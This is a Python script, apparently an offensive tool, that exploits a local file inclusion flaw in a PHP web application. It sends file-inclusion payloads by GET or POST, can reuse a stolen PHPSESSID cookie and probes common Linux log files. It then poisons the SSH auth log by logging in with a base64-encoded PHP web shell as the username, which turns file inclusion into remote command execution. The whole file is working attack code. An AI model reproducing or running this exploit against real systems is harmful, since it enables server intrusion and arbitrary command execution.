#!/usr/bin/env python3.11
import requests
import urllib3
import argparse
import paramiko
import base64
from urllib.parse import urlparse

COMMON_LOG_FILES = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/messages",
    "/var/log/syslog",
]

def detect_log_file(url, param, method="POST"):
    print("[*] Searching for SSH log file...")
    for log_file in COMMON_LOG_FILES:
        response = exploit_lfi(url, param, log_file, method)
        if response and "Invalid user" in response.text:  # Indicator of SSH logs
            print(f"[+] Found log file: {log_file}")
            return log_file
    print("[-] No log files found. Try specifying manually.")
    return None

def exploit_lfi(url, param, lfi_payload, method="POST"):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Send the LFI payload to the target URL depending on the method
    if method.upper() == "POST":
        response = requests.post(url, data={param: lfi_payload}, verify=False)
    elif method.upper() == "GET":
        response = requests.get(f"{url}?{param}={lfi_payload}", verify=False)
    else:
        print("Unsupported method, try again...")
        return None

    if response.status_code != 200:
        raise Exception("Failed to exploit LFI vulnerability")
    
    return response

def session_exploit(url, cookie, param,  lfi_payload):
    # Create an http session using the cookie
    session = requests.Session()
    session.cookies.set("PHPSESSID", cookie)
    response = session.post(url, data={param: lfi_payload}, verify=False)
    return response

def ssh_log_poison(target_ip, port=22):
    """
    Performs SSH log poisoning by injecting a Base64-encoded PHP shell as the username.
    """
    php_payload = "<?php system($_GET['cmd']); ?>"
    encoded_payload = base64.b64encode(php_payload.encode()).decode()

    ssh_payload = f"<?php eval(base64_decode('{encoded_payload}')); ?>"
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[+] Attempting SSH log poisoning on {target_ip}...")
        client.connect(target_ip, port=port, username=ssh_payload, password="fakepass")
    except paramiko.AuthenticationException:
        print("[+] Authentication failed (as expected), but payload should be logged!")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The target URL")
    parser.add_argument("param", help="The vulnerable parameter")
    parser.add_argument("lfi_payload", help="The LFI payload")
    parser.add_argument("method", choices=["GET", "POST"], nargs="?", default="POST", help="HTTP request type")
    parser.add_argument("--ssh", action="store_true", help="Perform SSH log poisoning")
    parser.add_argument("--cookie", help="The PHPSESSID cookie in case the vulnerability is authenticated.")
    parser.add_argument("--log-file", help="The log file to search for.")

    args = parser.parse_args()
    if not args.url or not args.param or not args.lfi_payload or not args.method:
        parser.print_help()

    if args.cookie:
        response = session_exploit(args.url, args.cookie, args.param, args.lfi_payload)
        print(response.text)
        
    
    if args.log_file:
        detect_log_file(args.url, args.param, args.method)

    if args.ssh:
        parsed_url = urlparse(args.url)
        target_ip = parsed_url.hostname
        
        if not target_ip:
            print("[-] Could not determine target IP. Make sure you provide a valid URL.")
        
        ssh_log_poison(target_ip)    
    
    response = exploit_lfi(args.url, args.param, args.lfi_payload, args.method)
    print(response.text)
    
if __name__ == "__main__":
    main()
